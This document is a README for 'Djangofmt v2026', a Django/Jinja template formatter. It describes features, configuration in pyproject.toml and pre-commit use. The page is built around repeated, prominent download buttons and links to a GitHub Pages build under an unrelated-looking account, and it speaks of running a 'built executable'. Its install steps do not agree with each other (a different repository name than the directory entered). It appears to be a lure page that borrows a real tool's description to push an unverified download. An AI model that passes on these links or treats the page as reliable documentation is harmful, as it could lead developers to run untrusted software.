# Djangofmt v2026 - Django Template Formatter 2026

> **A fast, HTML-aware formatter for Django templates in Python projects, supporting several template syntaxes in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/parkerjasonxmkz1928/djangofmt-html-formatter?style=flat-square)](https://github.com/parkerjasonxmkz1928/djangofmt-html-formatter)

---

<p align="center">
  <a href="https://parkerjasonxmkz1928.github.io/djangofmt-html-formatter/">
    <img src="https://img.shields.io/badge/Download-Djangofmt%20Latest-brightgreen?style=for-the-badge" alt="Download Djangofmt">
  </a>
</p>

> **[Download Djangofmt v2026](https://parkerjasonxmkz1928.github.io/djangofmt-html-formatter/)**

---

[Download Latest Build](https://parkerjasonxmkz1928.github.io/djangofmt-html-formatter/)

---

## What Djangofmt Does

Djangofmt brings HTML-aware formatting to Django template files through a Rust-based implementation. It is intended for Python projects that want predictable template layout while preserving awareness of both embedded markup and Django template syntax.

The formatter is also suited to repositories containing HTML, Jinja, Jinja2, and J2 files alongside Django templates. Recursive directory processing and `.gitignore` support make it practical for development, editor-driven formatting, and automated validation.

---

## Highlights

- Formats Django templates quickly with awareness of HTML structure
- Supports HTML, Jinja, Jinja2, and J2 file types
- Applies `.gitignore` rules while scanning directories recursively
- Processes complete template directories through recursive traversal
- Accepts project settings from `pyproject.toml`
- Uses EditorConfig rules to help maintain consistent style
- Integrates with pre-commit for automated formatting checks
- Includes shell completion support for common shells

---

## Installation

Clone the repository or download the current build, then make the executable or project files available in your workspace.

1. Clone the source repository:
   `git clone https://github.com/parkerjasonxmkz1928/djangofmt-html-formatter.git
2. Enter the project directory:
   `cd djangofmt`
3. Run Djangofmt from your environment, or start the built executable according to the installation method you selected.

For integration with other development tools, install it in the environment that contains your templates and project configuration.

---

## Running Djangofmt

To format one template, run:

`djangofmt path/to/template.html`

To process every template beneath a directory, use:

`djangofmt path/to/templates/`

Djangofmt can be added to editor automation or pre-commit workflows so changed templates remain consistently formatted. It can also work alongside the formatting rules already maintained by your project.

---

## Project Settings

Project-specific options are read from `pyproject.toml`. Djangofmt can additionally follow rules defined in an EditorConfig file.

A basic configuration can look like this:

`pyproject.toml`
```toml
[tool.djangofmt]
# formatter options go here
```

When EditorConfig is part of your workflow, place the configuration file at the repository root so the same style guidance can be shared across tools.

---

## Requirements and Compatibility

- A Python environment for execution and toolchain integration
- Template files in formats such as HTML, Django templates, Jinja, Jinja2, or J2
- Optional Rust build or runtime tooling when compiling Djangofmt from source
- Repository access when using recursive, `.gitignore`-aware formatting across a project tree

---

## Frequently Asked Questions

**Which template formats are supported?**  
Djangofmt handles HTML, Jinja, Jinja2, and J2 files in addition to Django templates.

**Can it be included in automated development checks?**  
Yes. It can be used with pre-commit hooks and editor integrations.

**Where are formatter options configured?**  
Set them in `pyproject.toml`; EditorConfig may also be used when applicable.

**Are ignored files excluded during recursive processing?**  
Yes. Directory traversal follows the repository's `.gitignore` rules.

**Where can I obtain a newer version?**  
Use the latest build link above, or update to the newest repository state when running from source.

**Does Djangofmt provide shell completions?**  
Yes. Completion scripts are available for supported shells.

---

## License

Djangofmt is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
